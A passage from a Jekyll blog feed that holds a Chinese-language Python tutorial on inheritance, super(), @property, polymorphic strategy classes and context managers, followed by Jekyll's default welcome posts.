<p>派生类，调用初始化Init方法，</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">Car</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">color</span><span class="o">=</span><span class="s">"绿色"</span><span class="p">):</span>
        <span class="n">Car</span><span class="p">.</span><span class="n">color</span> <span class="o">=</span> <span class="n">color</span>
        
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"我是</span><span class="si">{</span><span class="n">Car</span><span class="p">.</span><span class="n">color</span><span class="si">}</span><span class="s">的车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Aodi</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"我是奥迪车"</span><span class="p">)</span>
    
<span class="n">c</span> <span class="o">=</span> <span class="n">Car</span><span class="p">()</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">Aodi</span><span class="p">()</span>

<span class="n">c</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="超类">超类</h4>
<p>super() 是用来解决多重继承问题的，直接用类名调用父类方法在使用单继承的时候没问题，但是如果使用多继承，会涉及到查找顺序（MRO）、重复调用（钻石继承）等种种问题。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Aplus(object):
    def test(self):
        print("A")

class A(Aplus):
    def test(self):
        super().test()

t = A()
t.test()
</code></pre></div></div>

<h3 id="装饰器">装饰器</h3>

<p>装饰器</p>

<p>我们可以使用@property装饰器来创建<strong>只读属性</strong>，@property装饰器会将<strong>方法</strong>转换为相同名称的<strong>只读属性</strong>,可以与所定义的属性配合使用，这样可以防止属性被修改。</p>

<p>由于python进行属性的定义时，没办法设置私有属性，因此要通过@property的方法来进行设置。这样可以隐藏属性名，让用户进行使用的时候无法随意修改。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#设置class奥特曼
</span><span class="k">class</span> <span class="nc">AoteMan</span><span class="p">:</span>
    <span class="c1">#初始化属性
</span>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>

    <span class="c1">#设置get方法获取属性_name
</span>    <span class="k">def</span> <span class="nf">get_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">_name</span>
    
	<span class="c1">#设置set方法修改_name属性
</span>    <span class="k">def</span> <span class="nf">set_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">AoteMan</span><span class="p">(</span><span class="s">'迪迦'</span><span class="p">)</span>
<span class="c1">#new对象，传入值，迪迦，走到init初始化
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">())</span>
<span class="c1">#用get方法获取值
</span><span class="n">p</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="s">'泰罗'</span><span class="p">)</span>
<span class="c1">#set方法更新值
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">())</span>
</code></pre></div></div>

<p>用装饰器改变方法为属性</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AoteMan</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>
	<span class="c1">## 利用property装饰器将获取name方法转换为获取对象的属性
</span>    <span class="o">@</span><span class="nb">property</span>
    <span class="k">def</span> <span class="nf">get_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">_name</span>
    <span class="c1">## 利用property装饰器将设置name方法转换为获取对象的属性
</span>    <span class="o">@</span><span class="n">get_name</span><span class="p">.</span><span class="n">setter</span>
    <span class="k">def</span> <span class="nf">set_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>
        
<span class="n">p</span> <span class="o">=</span> <span class="n">AoteMan</span><span class="p">(</span><span class="s">'迪迦'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">)</span>   <span class="c1">## 原 p.get_name()  , 现 p.get_name，调用属性
</span><span class="n">p</span><span class="p">.</span><span class="n">set_name</span> <span class="o">=</span> <span class="s">'泰罗'</span> <span class="c1">## 原 p.set_name('泰罗')  ,现 p.set_name = '泰罗'
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">)</span>
</code></pre></div></div>

<p>装饰器setter</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Test</span><span class="p">():</span>
    <span class="o">@</span><span class="nb">property</span>
    <span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'is running here 1'</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">title</span>
    <span class="o">@</span><span class="n">name</span><span class="p">.</span><span class="n">setter</span>
    <span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'is running here 2'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">title</span> <span class="o">=</span> <span class="n">value</span>
    
<span class="n">t</span> <span class="o">=</span> <span class="n">Test</span><span class="p">()</span>
<span class="n">t</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">'123'</span>
<span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>


<span class="ow">is</span> <span class="n">running</span> <span class="n">here</span> <span class="mi">2</span>
<span class="ow">is</span> <span class="n">running</span> <span class="n">here</span> <span class="mi">1</span>
<span class="mi">123</span>
</code></pre></div></div>

<h3 id="开包闭包">开包闭包</h3>

<p>if else写法</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (strategy.equals("fast")) {
  // 快速执行
} else if (strategy.equals("normal")) {
  // 正常执行
} else if (strategy.equals("smooth")) {
  // 平滑执行
} else if (strategy.equals("slow")) {
  // 慢慢执行
}
</code></pre></div></div>

<p>多态替换，python中没有interface类，直接使用抽象类和抽象方法重写即可,以<strong>java</strong>为例</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface Strategy {
  void run() throws Exception;
}

class FastStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 快速执行逻辑
    }
}

class NormalStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 正常执行逻辑
    }
}

class SmoothStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 平滑执行逻辑
    }
}

class SlowStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 慢速执行逻辑
    }
}
</code></pre></div></div>

<h4 id="数组">数组</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int getDays(int month){
    if (month == 1)  return 31;
    if (month == 2)  return 29;
    if (month == 3)  return 31;
    if (month == 4)  return 30;
    if (month == 5)  return 31;
    if (month == 6)  return 30;
    if (month == 7)  return 31;
    if (month == 8)  return 31;
    if (month == 9)  return 30;
    if (month == 10)  return 31;
    if (month == 11)  return 30;
    if (month == 12)  return 31;
}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int monthDays[12] = {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
int getDays(int month){
    return monthDays[--month];
}
</code></pre></div></div>

<h4 id="上下文管理器">上下文管理器</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'test.txt'</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
	<span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>
<p>fopen中，如果不是使用with时，则需要再用完文件后进行关闭，以恢复资源，而如果使用上下文，则在with后运行完毕的代码将自动回收资源，即使异常也会关闭程序，但它，没有try的异常捕获</p>

<p>其原理在于，包含方法<code class="highlighter-rouge">__enter__()</code> 和<code class="highlighter-rouge"> __exit__()</code>，支持该协议对象要实现这两个方法。也就是说，如果是自定义类则需要包含<code class="highlighter-rouge">__init__</code>以及上述2种，假设其中具有run方法</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="n">MyClass</span><span class="p">(</span><span class="s">'test'</span><span class="p">)</span> <span class="k">as</span> <span class="n">mc</span><span class="p">:</span>
	<span class="n">mc</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>true</name></author><category term="python" /><category term="base" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/2018/05/17/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2018-05-17T14:05:21+08:00</published><updated>2018-05-17T14:05:21+08:00</updated><id>http://localhost:4000/2018/05/17/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2018/05/17/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>To add new posts, simply add a file in the <code class="highlighter-rouge">_posts</code> directory that follows the convention <code class="highlighter-rouge">YYYY-MM-DD-name-of-post.ext</code> and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name>true</name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">Hello Jekyll</title><link href="http://localhost:4000/2017/04/18/hello-jekyll.html" rel="alternate" type="text/html" title="Hello Jekyll" /><published>2017-04-18T00:00:00+08:00</published><updated>2017-04-18T00:00:00+08:00</updated><id>http://localhost:4000/2017/04/18/hello-jekyll</id><content type="html" xml:base="http://localhost:4000/2017/04/18/hello-jekyll.html"><![CDATA[<blockquote>
  <p>Transform your plain text into static websites and blogs.</p>
</blockquote>

<h1 id="welcome">Welcome</h1>

<h2 id="welcome-1">Welcome</h2>

<h3 id="welcome-2">Welcome</h3>

<p>This site aims to be a comprehensive guide to Jekyll. We’ll cover topics such as getting your site up and running, creating and managing your content, customizing the way your site works and looks, deploying to various environments, and give you some advice on participating in the future development of Jekyll itself.</p>

<h3 id="so-what-is-jekyll-exactlypermalink">So what is Jekyll, exactly?Permalink</h3>

<p>Jekyll is a simple, blog-aware, static site generator. It takes a template directory containing raw text files in various formats, runs it through a converter (like <a href="https://daringfireball.net/projects/markdown/">Markdown</a>) and our <a href="https://github.com/Shopify/liquid/wiki">Liquid</a> renderer, and spits out a complete, ready-to-publish static website suitable for serving with your favorite web server. Jekyll also happens to be the engine behind GitHub Pages, which means you can use Jekyll to host your project’s page, blog, or website from GitHub’s servers for free.</p>

<h3 id="helpful-hintspermalink">Helpful HintsPermalink</h3>

<p>Throughout this guide there are a number of small-but-handy pieces of information that can make using Jekyll easier, more interesting, and less hazardous. Here’s what to look out for.</p>

<h3 id="video-test">Video Test</h3>

<iframe type="text/html" width="100%" height="385" src="http://www.youtube.com/embed/gfmjMWjn-Xg" frameborder="0"></iframe>]]></content><author><name>Jekyll</name></author><category term="jekyll" /><summary type="html"><![CDATA[Transform your plain text into static websites and blogs.]]></summary></entry></feed>